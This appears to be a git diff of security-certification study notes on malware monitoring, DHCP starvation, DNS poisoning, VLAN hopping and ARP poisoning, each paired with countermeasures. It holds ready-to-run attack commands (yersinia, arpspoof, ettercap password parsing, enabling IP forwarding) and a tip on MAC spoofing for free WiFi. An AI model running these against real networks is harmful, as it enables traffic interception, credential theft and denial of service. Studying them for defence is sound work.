+- Tools include [SysAnalyzer](http://sandsprite.com/iDef/SysAnalyzer/), [Mirekusoft Install Monitor](https://www.mirekusoft.com/), [Revo Uninstaller Pro](https://www.revouninstaller.com/)
 
-### DHCP introduction
+##### Files and folder monitoring
 
-- DHCP: Dynamic Host Configuration Protocol
-- Client/server protocol
-- Used by routers as they start a DHCP server
-- Server provides following to DHCP-enabled clients:
-  - IP addresses
-  - Configuration information
-  - Time period of the lease offer
-- A possible way to drop connection of others in network is to brute-force DHCP server with "returning lease" messages.
-  - It'll force everybody to lose connection and request IP addresses again
+- Scan system files for suspicious files and folders
+- Tools include:
+  - `Sigverif`
+    - Built-in Windows tool
+    - Identifies unsigned drivers
+  - [Tripwire File Integrity Manager](https://www.tripwire.com/products/tripwire-file-integrity-manager)
+  - [CSP File Integrity Checker](https://www.cspsecurity.com/solutions/compliance-and-file-monitoring/file-integrity-checker/).
 
-#### DHCP snooping
+##### Device drivers monitoring
 
-- Layer 2 security feature
-- Built into operating system of a capable network switches
-- Filters, rate-limits suspicious DHCP traffic
-- Builds and maintains the **DHCP snooping binding database**
-  - Also known as **DHCP snooping binding table**
-  - Stores MAC + assigned IP + [VLAN](#vlan) and switch ports
-  - Uses to validate subsequent requests from untrusted hosts.
-- 📝 **Dynamic ARP Inspection (DAI)**
-  - Defense against too many incoming ARP broadcasts.
-  - Each port on VLAN is untrusted by default
-  - Each IP to MAC conversion is validated using DHCP snooping binding database.
+- Malware installs with some infected drivers
+- Drivers can be seen by: Run -> `msinfo32` -> Software Environment -> System Drivers
+- Tools include [DriverView](https://www.nirsoft.net/utils/driverview.html), [Driver Booster](https://www.iobit.com/en/driver-booster.php)
 
-### DHCP starvation
+##### Network traffic monitoring/analysis
 
-- Exhaust all available addresses from the server
-- Exploits that DHCP has a limited number of ip addresses to lease.
-- A type of Denial of Service attack
+- Includes capturing traffic to look for malware activity
+- Tools for capturing and monitoring include: [Wireshark](https://www.wireshark.org/), [Capsa Network Analyzer](https://www.colasoft.com/capsa/)
+
+##### DNS monitoring/resolution
+
+- DNSChanger is a DNS hijacking Trojan that can point DNS entries toward malicious name servers.
+- Use e.g. [DNSQuerySniffer](https://www.nirsoft.net/utils/dns_query_sniffer.html), [DNSstuff](https://www.dnsstuff.com/).
+
+##### API calls monitoring
+
+- Malware use Windows APIs to perform malicious task
+- API call monitoring tools include [API Monitor](http://www.rohitab.com/apimonitor), [Runscope](https://www.runscope.com/)
+
+##### System baselining
+
+- Allows monitoring security configuration changes over time
 - Flow
-  1. Starve it, and no new clients will be able to connect
-     1. Attacker broadcasts large number of DHCP REQUEST messages with spoofed source MAC addresses.
-     2. Available IP addresses in the DHCP server scope becomes depleted.
-     3. DHCP server becomes unable to allocate configurations to new clients and issue any IP addresses
-  2. Set-up rogue (fake server) to respond to the discovery requests
-     1. Attacker sets up a rogue DHCP server to respond to DHCP discovery requests.
-     2. If a client accepts the rogue server as its DHCP server, then the attacker can listen to all traffic going from or to the client.
-- **Tools**
-  - [`yersinia`](https://linux.die.net/man/8/yersinia)
-    - Start UI using `yersinia -G` then click on "Start attack"
-  - [DHCPstarv](http://dhcpstarv.sourceforge.net/)
+  1. Take snapshots before and then after malware execution.
+  2. Compare the snapshots to understand changes made by the malware.
 
-### DHCP starvation countermeasures
+#### Unix integrity monitoring
 
-- Authentication
-- Configure [DHCP snooping](#dhcp-snooping)
-- Trusted sources
-  - ❗Vulnerable to mimicing them
+- Display processes: `ps -ef`
+  - `-e`: selects all processes
+  - `-f`: switch provides a full listing
 
-#### Port security
+## Sandboxing
 
-- Allows traffic from a specific MAC address to enter to a port
-- Only allowing one MAC through a port
-- Only one IP at a time can be requested
-- ❗ Vulnerable to [spoofing MAC addresses](./spoofing-attacks.md#mac-spoofing)
+- Technique in which you create an isolated test environment
+  - Allows secure experimentation
+  - Nothing (no harm) can be spilled out of the environment.
+    - If something happens, the damage is confined to that sandbox
+- Examples
+  - **Chrome web-browser**
+    - Sandboxing through multi-process architecture.
+    - One or more processes are assigned to run scripts of each site.
+    - Each Chrome extension and app runs in its own process
+  - **Virtual machines**
+    - Good for testing / reverse engineering malware
+    - E.g. YouTubers messing with scammers utilizes virtual machines, [video](https://www.youtube.com/watch?v=BQ3FD26Bv8c), [video](https://www.youtube.com/watch?v=vgYeDMwteZo)
+    - 💡 Good hypervisor is important to ensure nothing goes out of the environment.
+      - E.g. KVM (used by AWS) is good on AWS, and Hyper-V in Windows
+        - KVM installation in Fedora: `dnf install @Virtualization` and then `virt-manager` to start a GUI.
+      - VirtualBox is not as feature rich.
+    - 💡 Make sure host environment is safe in first place
+      - E.g. in Linux you can enable [Security-Enhanced Linux](https://en.wikipedia.org/wiki/Security-Enhanced_Linux) (SELinux).
+        - Supported by Fedora, Debian, Ubuntu, used by default by Android.
+        - `setenforce 1` to enable, `getenforce` to query status
 
-## DNS poisoning
+## Anti-malware software
 
-### DNS introduction
+- Includes e.g. antivirus, anti-spyware, anti-trojans, anti-spamware, anti-phishing, and email scanners.
+- Helps detecting, mitigating, preventing and repairing any damage by malware.
+- Looks for behavior typical to viruses and give warnings.
+- Looks for already known virus signatures and warns the user if a threat is found.
+- E.g. Kaspersky, McAffee, AVG, Norton, Avira, Bitdefender
 
-- Domain Name Server
-- 📝 Protocol that resolves domain names into IP addresses using default port 53.
-- Stores domain name and IP address pairs in a **DNS table**.
+### Detection types
 
-### DNS poisoning attack
+- **Signature-based**
+  - Compare file hash and malware hash
+  - ❗ Anything new or custom written will not be detected
+- **Rule-based (behavior-based)**
+  - 📝 Relies on differentiating expected vs anomalous behavior
+  - Analyzes certain characteristics of a program.
+    - E.g. application accessing user login file. Why?
+  - Can utilize AI & ML to decide whether something is a malware.
+- **Sandboxing**
+  - Creates environment, lets program run and examines its behavior.
+  - Good to find out behavior of e.g. self-modifying code, encrypted code.
 
-- 📝 Also known as **DNS cache poisoning** and **DNS spoofing**
-- 📝 Manipulating the DNS table by replacing a legitimate IP address with a malicious one
-  - E.g. redirecting `cloudarchitecture.io` to attackers IP address.
-- 🤗 Used for internet censorship in many countries.
-- Flow
-  1. Attacker makes DNS request to target
-  2. DNS server asks the root name server for the entry
-  3. Attacker floods the DNS server with a fake response for the targeted domain until legitimate response from root server is ignored
-  4. The poisoned entry remains in cache for hours and even days
-- Can be used after [ARP poisoning](./arp-poisoning.md) through **DNS spoof** plugin of [Ettercap](https://www.ettercap-project.org/).
-- Can be followed up with e.g. • man-in-the-middle attacks • [website defacement](./../12-web-servers/web-server-threats-and-attacks.md#website-defacement) attacks
+## 📝 Virus detection methods
 
-### DNS poisoning countermeasures
+- **Scanning**
+  - Scans malware for known signatures (characteristics)
+  - ❗ Only known and predefined viruses can be detected
+- **Integrity checking**
+  - Verifies files against their recorded integrated data
+- **Interception**
+  - Intercepts the virus if it detect suspicious behavior (e.g. network access) and asks user if the user wants to continue.
+  - Useful for logic bombs (only executed if certain conditions are met) or trojans
+- **Code emulation**
+  - Executes a virtual machine mimicking CPU and memory
+  - Useful against encrypted, polymorphic or metamorphic viruses
+- **Heuristic analysis**
+  - Helps in detecting new or unknown viruses
+  - **Static**: anti-virus decompiles and analyzes the binary
+  - **Dynamic**: anti-virus runs code emulation to determine if the code is viral
+  - Prone to many false positives
 
-- **Active monitoring**
-  - Monitor DNS data for new patterns such as new host
-  - E.g. by using intrusion detection system (IDS)
-- **Keep DNS servers up-to-date**
-  - Updated versions have port randomization and cryptographically secure transaction IDs against attackers.
-- **Randomize source and destination IP, query IDs, during name requests**
-  - Makes harder for attackers to send spoofed responses as it'd be harder to guess the address and query ID.
-- **Use HTTPS and/or TLS for securing the traffic**
-  - Also known as **DNS over HTTPS (DoH)** and **DNS over TLS (DoT)**
-  - SSL and TLS use certificates to verify the identity of the other party.
-  - So although they do not protect against cache poisoning itself, the certificates help to protect against the results
+## Malware countermeasures
 
-#### DNSSEC (Domain Name System Security Extension)
+- Use up-to-date anti-virus, firewall and intrusion detection software with regular scans
+- Block all unnecessary ports at the host and firewall.
+- On Windows
+  - Enable Windows Defender
+  - Enable [Data Execution Prevention (DEP)](#data-execution-prevention-dep)
+  - Run registry monitoring tools to find malicious registry entries added by the backdoor
+- Enable [Address space layout randomization (ASLR)](#address-space-layout-randomization-aslr)
+- Do not open files with more than one file type extension
+- Use [anti-malware software](#anti-malware-software)
+- Avoid accepting executables sent as messages or downloaded from untrusted sources.
+- Inspect network packets using protocol monitoring tools
 
-- Developed by The Internet Engineering Task Force (IETF)
-  - Open standards organization, which develops and promotes voluntary Internet standards
-- Help verifying the true originator of DNS messaging
-- 📝 Provides secure DNS data authentication by using digital signatures and encryption.
-  - Adds cryptographic signatures to existing DNS records, stored in DNS name servers.
-- Widely considered one of the greatest cache poisoning prevention tool as a defense
-- Allows verifying that a requested DNS record comes from its authoritative name server and wasn't altered, opposed to a fake record injected in a man-in-the-middle attack.
-- **Chain of trust**: E.g. `cloudarchitecture.io`'s signature is verified by `.io` signature that is verified by root certificate (signed by [IANA](https://www.cloudflare.com/en-gb/dns/dnssec/root-signing-ceremony/))
-  - **IANA**: Centrally coordinates Internet for DNS Root, IP addressing, and other Internet protocol resources.
+### Data Execution Prevention (DEP)
 
-## VLAN hopping
+- 📝 Marks memory regions as non-executable, such that an attempt to execute machine code in these regions will cause an exception
+- Executable space protection in Windows
+- Read more on [Data Execution Prevention | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
 
-### VLAN
+### Address space layout randomization (ASLR)
 
-- 📝 Allows multiple separate LANs/networks on same switch through logical grouping
-- Provides network separation
-  - Hosts one one VLAN does not see hosts on other one
-- **Port-based VLAN**
-  1. Designate set of ports on the switch
-     - account department VLAN, shipping department VLAN..
-  2. Connect devices to right ports each group is a VLAN
-- **Tag-based VLAN** aka IEEE 802.1q VLANs
-  - Basically a tags frames with which VLAN it belongs to
-    - Frame = Primitive packet on layer 2
-  - Tagged frame = IEEE 802.1q frame
-  - Can tag/assign based on e.g. [802.1x](./../09-wireless-networks/wireless-networks-overview.md#ieee-8021x)
-- **Trunk** (=802.1q link)
-  - Allows sharing VLANs (VLAN IDs) between switches
-
-### VLAN hopping attack
-
-- Attacking host on a VLAN to gain access to traffic on other VLANs
-- E.g. using [Frogger](https://github.com/nccgroup/vlan-hopping---frogger)
-- **Switch spoofing**
-  - Attacking host imitates a trunking switch
-- **Double tagging**
-  - Attacker prepends two VLAN tags to frames
-  - Second tag is the target host
-  - First switch removes first innocent VLAN tag and sends packet to second switch.
-  - Allows bypassing security mechanisms and reaching the target hosts.
-  - Replies are not forwarded to the attacker host
-
-## OSPF attacks
-
-- Forms a trusted relationship with the adjacent router
-- Usually these attacks go undetected
-- **Remote attacks**: caused by misconfigurations
-
-### OSPF: Open Shortest Path First
-
-- Most popular routing protocol for IP networks
-- Dynamically discovers neighbors like RIPv2 and BPG (Border Gateway Protocol)
-- Used by e.g. internet service providers (ISP) and cloud providers for hybrid communication
-
-### Compromised router attacks
-
-- Placing a rogue router in target network e.g. remote branch/headquarters
-- Allows attacker to inject routes to redirect traffic for MITM attacks or DoS attacks.
-- Attacker learns about that entire routing domain such network types, links etc
-
-### OSPF attacks countermeasures
-
-- 📝 Configure OSPF to authenticate every OSPF message
-  - Routers must pass the authentication process before becoming OSPF neighbors.
-- Monitor OSPF neighbors for eavesdropping through e.g. a SIEM
+- 📝 Prevents exploitation of memory corruption vulnerabilities.
+- Involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space
+- Breaks assumptions that attackers could make about where programs and libraries would lie in memory at runtime
 # Sniffing overview
 
 - Capturing data packets on a network using a program or a device.
@@ -6867,6 +6457,210 @@ environment variable named `HTTP_SIKE` available in your CGI.
 - [Wi.cap. Network Sniffer Pro](https://play.google.com/store/apps/details?id=com.evbadroid.wicap&hl=en&gl=US) for Android
 - [FaceNiff](http://faceniff.ponury.net/) for Android (rooted only)
 - [PacketCapture](https://play.google.com/store/apps/details?id=app.greyshirts.sslcapture) for android
+# Sniffing attacks overview
+
+- [Spoofing attacks](./spoofing-attacks.md)
+- [ARP posioning](./arp-poisoning.md)
+
+## MAC flooding
+
+### MAC
+
+- MAC address is a unique identifier of a network node.
+- E.g. `52:54:00:e5:83:bb`
+  - First three sets (`52:54:00`): Manufacturers signature
+  - Last three sets is set in different ways depending on manufacturers
+- Embedded in the device (firmware or some read-only part of the device)
+- In a network, each device has its own MAC address
+  - Associates the device with a physical port
+- 🤗 If your MAC address is logged, police can use it to contact the manufacturer to ask who purchased the device.
+  - Difficult to trace it if it was paid by cash.
+- 💡🤗 You may have free WiFi forever if you can change your MAC address.
+  - Usually checked in public places e.g. in an airport when they give you free WiFi.
+
+#### Content Addressable Memory (CAM) table
+
+- Used by switches
+- Stores all available MAC addresses and their virtual LAN parameters for each port.
+- Possible to sniff by flooding it.
+
+### MAC flooding attack
+
+- Flooding the switch with thousands of MAC address mappings such that it cannot keep up.
+  - When the table can't keep up it starts sending every message out to every port.
+  - I.e. switch is forced to behave as a hub.
+- Allowed by the fixed size of the CAM table.
+- Steps:
+  1. Send large number of fake MAC addresses to the switch until CAM table becomes full
+  2. Switch enters fail-open mode
+     - where it broadcasts the incoming traffic to all ports on the network
+  3. Attacker (with promiscuous mode) starts sniffing the traffic passing through the network.
+- Can be followed up using [ARP spoofing](./arp-poisoning.md) to retain access to data after switches recover.
+- See also [MAC spoofing](./spoofing-attacks.md#mac-spoofing)
+
+## DHCP attacks
+
+### DHCP introduction
+
+- DHCP: Dynamic Host Configuration Protocol
+- Client/server protocol
+- Used by routers as they start a DHCP server
+- Server provides following to DHCP-enabled clients:
+  - IP addresses
+  - Configuration information
+  - Time period of the lease offer
+- A possible way to drop connection of others in network is to brute-force DHCP server with "returning lease" messages.
+  - It'll force everybody to lose connection and request IP addresses again
+
+#### DHCP snooping
+
+- Layer 2 security feature
+- Built into operating system of a capable network switches
+- Filters, rate-limits suspicious DHCP traffic
+- Builds and maintains the **DHCP snooping binding database**
+  - Also known as **DHCP snooping binding table**
+  - Stores MAC + assigned IP + [VLAN](#vlan) and switch ports
+  - Uses to validate subsequent requests from untrusted hosts.
+- 📝 **Dynamic ARP Inspection (DAI)**
+  - Defense against too many incoming ARP broadcasts.
+  - Each port on VLAN is untrusted by default
+  - Each IP to MAC conversion is validated using DHCP snooping binding database.
+
+### DHCP starvation
+
+- Exhaust all available addresses from the server
+- Exploits that DHCP has a limited number of ip addresses to lease.
+- A type of Denial of Service attack
+- Flow
+  1. Starve it, and no new clients will be able to connect
+     1. Attacker broadcasts large number of DHCP REQUEST messages with spoofed source MAC addresses.
+     2. Available IP addresses in the DHCP server scope becomes depleted.
+     3. DHCP server becomes unable to allocate configurations to new clients and issue any IP addresses
+  2. Set-up rogue (fake server) to respond to the discovery requests
+     1. Attacker sets up a rogue DHCP server to respond to DHCP discovery requests.
+     2. If a client accepts the rogue server as its DHCP server, then the attacker can listen to all traffic going from or to the client.
+- **Tools**
+  - [`yersinia`](https://linux.die.net/man/8/yersinia)
+    - Start UI using `yersinia -G` then click on "Start attack"
+  - [DHCPstarv](http://dhcpstarv.sourceforge.net/)
+
+### DHCP starvation countermeasures
+
+- Authentication
+- Configure [DHCP snooping](#dhcp-snooping)
+- Trusted sources
+  - ❗Vulnerable to mimicing them
+
+#### Port security
+
+- Allows traffic from a specific MAC address to enter to a port
+- Only allowing one MAC through a port
+- Only one IP at a time can be requested
+- ❗ Vulnerable to [spoofing MAC addresses](./spoofing-attacks.md#mac-spoofing)
+
+## DNS poisoning
+
+### DNS introduction
+
+- Domain Name Server
+- 📝 Protocol that resolves domain names into IP addresses using default port 53.
+- Stores domain name and IP address pairs in a **DNS table**.
+
+### DNS poisoning attack
+
+- 📝 Also known as **DNS cache poisoning** and **DNS spoofing**
+- 📝 Manipulating the DNS table by replacing a legitimate IP address with a malicious one
+  - E.g. redirecting `cloudarchitecture.io` to attackers IP address.
+- 🤗 Used for internet censorship in many countries.
+- Flow
+  1. Attacker makes DNS request to target
+  2. DNS server asks the root name server for the entry
+  3. Attacker floods the DNS server with a fake response for the targeted domain until legitimate response from root server is ignored
+  4. The poisoned entry remains in cache for hours and even days
+- Can be used after [ARP poisoning](./arp-poisoning.md) through **DNS spoof** plugin of [Ettercap](https://www.ettercap-project.org/).
+- Can be followed up with e.g. • man-in-the-middle attacks • [website defacement](./../12-web-servers/web-server-threats-and-attacks.md#website-defacement) attacks
+
+### DNS poisoning countermeasures
+
+- **Active monitoring**
+  - Monitor DNS data for new patterns such as new host
+  - E.g. by using intrusion detection system (IDS)
+- **Keep DNS servers up-to-date**
+  - Updated versions have port randomization and cryptographically secure transaction IDs against attackers.
+- **Randomize source and destination IP, query IDs, during name requests**
+  - Makes harder for attackers to send spoofed responses as it'd be harder to guess the address and query ID.
+- **Use HTTPS and/or TLS for securing the traffic**
+  - Also known as **DNS over HTTPS (DoH)** and **DNS over TLS (DoT)**
+  - SSL and TLS use certificates to verify the identity of the other party.
+  - So although they do not protect against cache poisoning itself, the certificates help to protect against the results
+
+#### DNSSEC (Domain Name System Security Extension)
+
+- Developed by The Internet Engineering Task Force (IETF)
+  - Open standards organization, which develops and promotes voluntary Internet standards
+- Help verifying the true originator of DNS messaging
+- 📝 Provides secure DNS data authentication by using digital signatures and encryption.
+  - Adds cryptographic signatures to existing DNS records, stored in DNS name servers.
+- Widely considered one of the greatest cache poisoning prevention tool as a defense
+- Allows verifying that a requested DNS record comes from its authoritative name server and wasn't altered, opposed to a fake record injected in a man-in-the-middle attack.
+- **Chain of trust**: E.g. `cloudarchitecture.io`'s signature is verified by `.io` signature that is verified by root certificate (signed by [IANA](https://www.cloudflare.com/en-gb/dns/dnssec/root-signing-ceremony/))
+  - **IANA**: Centrally coordinates Internet for DNS Root, IP addressing, and other Internet protocol resources.
+
+## VLAN hopping
+
+### VLAN
+
+- 📝 Allows multiple separate LANs/networks on same switch through logical grouping
+- Provides network separation
+  - Hosts one one VLAN does not see hosts on other one
+- **Port-based VLAN**
+  1. Designate set of ports on the switch
+     - account department VLAN, shipping department VLAN..
+  2. Connect devices to right ports each group is a VLAN
+- **Tag-based VLAN** aka IEEE 802.1q VLANs
+  - Basically a tags frames with which VLAN it belongs to
+    - Frame = Primitive packet on layer 2
+  - Tagged frame = IEEE 802.1q frame
+  - Can tag/assign based on e.g. [802.1x](./../09-wireless-networks/wireless-networks-overview.md#ieee-8021x)
+- **Trunk** (=802.1q link)
+  - Allows sharing VLANs (VLAN IDs) between switches
+
+### VLAN hopping attack
+
+- Attacking host on a VLAN to gain access to traffic on other VLANs
+- E.g. using [Frogger](https://github.com/nccgroup/vlan-hopping---frogger)
+- **Switch spoofing**
+  - Attacking host imitates a trunking switch
+- **Double tagging**
+  - Attacker prepends two VLAN tags to frames
+  - Second tag is the target host
+  - First switch removes first innocent VLAN tag and sends packet to second switch.
+  - Allows bypassing security mechanisms and reaching the target hosts.
+  - Replies are not forwarded to the attacker host
+
+## OSPF attacks
+
+- Forms a trusted relationship with the adjacent router
+- Usually these attacks go undetected
+- **Remote attacks**: caused by misconfigurations
+
+### OSPF: Open Shortest Path First
+
+- Most popular routing protocol for IP networks
+- Dynamically discovers neighbors like RIPv2 and BPG (Border Gateway Protocol)
+- Used by e.g. internet service providers (ISP) and cloud providers for hybrid communication
+
+### Compromised router attacks
+
+- Placing a rogue router in target network e.g. remote branch/headquarters
+- Allows attacker to inject routes to redirect traffic for MITM attacks or DoS attacks.
+- Attacker learns about that entire routing domain such network types, links etc
+
+### OSPF attacks countermeasures
+
+- 📝 Configure OSPF to authenticate every OSPF message
+  - Routers must pass the authentication process before becoming OSPF neighbors.
+- Monitor OSPF neighbors for eavesdropping through e.g. a SIEM
 # Spoofing attacks
 
 - Entails changing a computer's identity
@@ -6966,164 +6760,94 @@ environment variable named `HTTP_SIKE` available in your CGI.
   - Disable IRDP
   - Use digital signatures
   - Block all type 9 and type 10 ICMP packets.
-# AAA protocols
+# ARP poisoning
 
-- AAA stands for (Authentication, Authorization, Accounting)
-- Family of protocols that mediate network access.
-- Sometimes these protocols are used in combination with
-  - [Point-to-Point Protocol (PPP)](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol)
-  - [Extensible Authentication Protocol (EAP)](#extensible-authentication-protocol-eap)
-  - Protected Extensible Authentication Protocol (PEAP)
-  - [Lightweight Directory Access Protocol (LDAP)](./../04-enumeration/enumeration-overview.md#ldap)
-- Most commonly used protocol is [RADIUS](#radius) and then [Diameter](#diameter), meanwhile older systems use [TACACS](#tacacs) and [TACACS+](#tacacs-tacacs-plus)
+## ARP
 
-## RADIUS
+- ARP stands for "Address Resolution Protocol"
+- 📝 In charge of resolving IP addresses to MAC addresses
+- Can be used for obtaining MAC addresses of devices on the network
+- Packets are `ARP_REQUEST` and `ARP_REPLY`
+- Commands
+  - `arp -a`: displays current ARP cache
+  - `arp -d *`: clears ARP cache
 
-- Stands for **R**emote **A**uthentication **D**ial **I**n **U**ser **S**ervice
-- 📝 Commonly used by ISPs (Internet Service Providers) and corporations for access control
-- Primarily used to manage access to the internet or other networks
-  - Networks can employ a variety of networking technologies, including analog modems, DSL, wireless local area networks (WLANs), and VPNs.
-- Based on UDP (User Datagram Protocol)
-- Flexible and extensible offering a variety of ways to authenticate the user
-- Requires setting-up a RADIUS back-end server.
-  - Usually integrated with AD (active directory)
+### ARP table
 
-### Extensible Authentication Protocol (EAP)
+- Used to map MAC addresses to ip addresses
+- Every network interface has its own ARP table
+- 📝 If no ARP entry exist:
+  1. Computer A broadcasts an APR request in network asking for the MAC address from a specific IP.
+  2. Computer B replies its MAC and IP address
+  3. Computer A inserts it to its ARP table for future use
 
-- Authentication framework used by [Enterprise WPA operation mode](./wireless-networks-overview.md#enterprise).
-- Strong when used with TLS (EAP-TLS)
-  - Higher security when client-side certificates are hosted in smart cards.
-- Extends and replaces [Point-to-Point Protocol (PPP)](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol).
+## ARP poisoning attack
 
-#### EAP Transport Layer Security (EAP-TLS)
+- Also known as • ***ARP spoofing*** • ***ARP spoofing*** • ***ARP cache poisoning*** • ***ARP poison routing*** • ***ARP cache flooding*** • ***ARP flooding***.
+- Man in the middle attack between the victim and switch.
+- Floods the target machines ARP cache with forged requests and responses.
+- Exploits ARP not verifying the device authenticity
+- If ARP cache becomes full, different behaviors can be observed depending on the manufacturer/implementation:
+  - May [force switch to operates in fail-safe mode](https://www.trendmicro.com/vinfo/se/threat-encyclopedia/archive/security-advisories/arp%20flooding%20attack)
+    - Behaves as a hub i.e. sends packets to every to all hosts
+    - Same behavior is also seen in [MAC flooding](./sniffing-attacks-overview.md#mac-flooding-attack)
+  - In [Linux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/neighbour.c#n388) it may:
+    - Drop the oldest / most stale entry from the table (by garbage collector)
+    - Reject new entries
 
-- Secure standard using TLS protocol
-- Requires mutual authentication
-  - Where the client-side certificate can be stored in e.g. smart cards.
+### ARP poisoning attack steps
 
-## Diameter
+1. **Gather information**
+   1. Get victim IP address, e.g. `192.168.122.183`
+      - E.g. through [host discovery using `nmap`](./../03-scanning-networks/scanning-tools.md#-p-ping-host-discovery-options) e.g. `nmap -sn 192.168.0.0/24`
+   2. Get default gateway IP, e.g. `192.168.122.1`
+      - Usually IP of the machine ending with `.1`
+      - Usually same for everyone on same network
+      - Default gateway is the forwarding host (router) to internet when no other specification matches the destination IP address of a packet.
+2. **Enable forwarding mode to sniff the traffic**
+   - `echo 1 > /proc/sys/net/ipv4/ip_forward` in Linux.
+   - ❗Otherwise no traffic is going through and you're just DOSing.
+3. **Attack**
+   - ![ARP spoofing attack](./img/arp-spoofing-during.png)
+   - Deceive the victim device through flooding ARP reply packets to it.
+     - Change gateways MAC address is to the attackers
+   - 📝 Use an ARP spoofing tool e.g.
+     - [`arpspoof`](https://linux.die.net/man/8/arpspoof)
+       - `arpspoof -t <victim-machine-ip> <default-gateway-ip>`
+       - `arpspoof -t <default-gateway-ip> <victim-machine-ip>`
+     - [`ettercap`](https://www.ettercap-project.org/)
+       - Also sniffs passwords automatically
+       - `ettercap -NaC <default-gateway-ip> <victim-machine-ip>`
+         - `N`: make it non-interactive
+         - `a`: arp posion
+         - `c`: parse out passwords and usernames.
+     - [Cain and Abel (Cain & Abel)](./sniffing-tools.md#cain-and-abel) on Windows
+   - ![After ARP spoofing attack](./img/arp-spoofing-after.png)
+4. **Sniff**
+   - Now you sniff the traffic between two devices.
+     - If through HTTPS & SSL you can only see basic data such as User Agent and domain names.
+   - Can use e.g. [`wireshark`](https://www.wireshark.org/) or [dsniff](https://www.monkey.org/~dugsong/dsniff/)
 
-- Successor to RADIUS
-- Not directly backwards compatible
-- Security is provided by [IPsec](./../15-cryptography/tunneling-protocols.md#ipsec) or [TLS](./../15-cryptography/encrypting-communication.md#tls-transport-layer-security) and privacy protocols.
+### ARP poisoning attack countermeasures
 
-## TACACS
+- Configure [DHCP snooping](./sniffing-attacks-overview.md#dhcp-snooping)
+- Add **static** IP-MAC entries to the cache.
+  - Then it will not process any ARP Replies received unlike a dynamic ARP cache.
+- Use Intrusion Detection Systems (IDS)
 
-- Terminal Access Controller Access-Control System
-- Remote authentication protocol
-- Commonly used in networks of UNIX systems
+## ARP poisoning countermeasures
 
-## TACACS+ (TACACS plus)
-
-- Terminal Access Controller Access-Control System Plus
-- Provides access control for routers, network access servers, and other
-networked computing devices via one or more centralized servers.
-- Based on TACACS but an entirely new protocol (incompatible with TACACS)
-- Runs on older systems but generally replaced by [RADIUS](#radius)
-# Bluetooth
-
-- Range is typically less than 10m
-- Operates on the 2.4 GHz
-- Discovery feature can control the visibility of the device
-- **Bluetooth Low Energy (BLE)**: Bluetooth >= 4.0
-- **Bluetooth Classic (BC)**: Bluetooth < 4.0
-- Uses WPAN (wireless personal area network)
-- Utilize the Gaussian Frequency Shift Keying (FSK) to exchange information in the basic rate (BR) of usually 1 mbps.
-
-## Bluetooth security
-
-- Standard provides three basic security services:
-  - **Authentication**
-    - To verify the identity of communicating devices
-  - **Confidentiality**
-    - To prevent the compromise of information and ensure that only
-    authorized devices can access and view data.
-  - **Authorization**
-    - To allow the control of resources by ensuring that a device is
-    authorized to use a service before permitting it to do so.
-- ❗ Standard does not address address other security services such as audit and non-repudiation.
-- Four security modes (levels):
-  1. **Mode 1**: No authentication/encryption.
-  2. **Mode 2**: Authorization with access control policies.
-  3. **Mode 3**: Mandate authentication and encryption using secret key with paired devices
-  4. **Mode 4**: Secure Simple Pairing using [Elliptic-Curve Diffie-Hellman (ECDH)](./../15-cryptography/encryption-algorithms.md#elliptic-curve-diffiehellman) for key exchange and link key generation
-
-## Bluetooth device discovery
-
-- [BlueScanner](https://sourceforge.net/projects/bluescanner/): Finds devices around and displays information
-- [BT Browser](http://www.bluejackingtools.com/java/bt-browser-20/): Find and enumerate nearby devices
-
-## Bluetooth attacks
-
-### BlueSmacking
-
-- 📝 DoS attack using echo.
-
-### BlueJacking
-
-- 📝 Sending unsolicited data to bluetooth devices
-- Allows spamming for bluetooth also known as **BlueSpamming**
-- ❗ Not related to hijacking
-
-### BluePrinting
-
-- 📝 Extracting information about the device
-
-### BlueSnarfing
-
-- 📝 Stealing data from target device
-- E.g. calendars, contact lists, emails and text messages
-
-### BlackJacking
-
-- 📝 Exploits a blackberry device to attack corporate LAN directly
-- Compromises blackberry then proxies between corporate servers and attacker.
-
-#### BBProxy
-
-- 📝 Bluejacking tool
-- Included in [BlackBerry Attack Toolkit](https://sourceforge.net/projects/bbat/)
-- Announced by [DefCon](https://www.defcon.org/images/defcon-14/dc-14-presentations/DC-14-X30n.pdf)
-
-### BlueBugging
-
-- Also known as **bluebug-attack**
-- Create a [backdoor attack](./../07-malware/malware-overview.md#backdoor) before returning control of the phone to its owner
-- Extends [BlueJacking](#bluejacking) and [BlueSnarfing](#bluesnarfing) (allows attacker to access data)
-- E.g. by pretending to be a headset to receive phone calls
-- Not so common as vulnerabilities are generally patched
-
-#### Bloover
-
-- A proof-of-concept [tool](https://trifinite.org/trifinite_stuff_blooover.html)
-- 📝 Exploits bluebugging targeting J2ME (Java micro edition) enabled phones such as Nokia
-- [Bloover II](https://trifinite.org/trifinite_stuff_bloooverii.html): Exploits bluebug and also helomoto, bluesnarf and OBEX object push attacks
-
-## Bluetooth attacks countermeasures
-
-- Check paired devices
-- Turn off visibility / turn off Bluetooth if not used
-- Use strong PIN
-- Use encryption
-- Use the strongest security mode available
-- Don't accept unknown requests
-- Use [bluetooth security tools](#bluetooth-security-tools)
-
-## Bluetooth security tools
-
-- [Bluetooth firewall](http://www.fruitmobile.com/bt_firewall.html)
-  - Mobile app for logging and monitoring Bluetooth connections
-  - Radar feature allows you to scan nearby bluetooth devices
-  - Scan feature lists apps that can perform bluetooth actions
-- [Bluediving](https://github.com/balle/bluediving)
-  - Bluetooth penetration suite
-  - Exploits BlueBug, BlueSnarf, BlueSnarf++ and BlueSmack
-- [Bluelog](https://github.com/MS3FGX/Bluelog)
-  - Linux Bluetooth scanner
-- [btscanner](https://packages.debian.org/unstable/btscanner)
-  - Debian tool to extract information from a Bluetooth device without the requirement to pair.
-- [BlueRanger](https://tools.kali.org/wireless-attacks/blueranger)
-  - Simple Bash script which uses Link Quality to locate Bluetooth device radios
+- **ARP spoofing detection and prevention**
+  - Relies on some form of certification or cross-checking of ARP responses
+  - Can be implemented on individual hosts, hypervisors or switches
+  - 📝 E.g. [DHCP snooping](./sniffing-attacks-overview.md#dhcp-snooping) feature on switch OS can activate **Dynamic ARP Inspection** with an internal database.
+  - ❗ Not possible if any host holds a static IP, and static ARP entries must be used.
+- **Static ARP entries**
+  - Manually mapping IP addresses to MAC addresses (maintaining ARP entries)
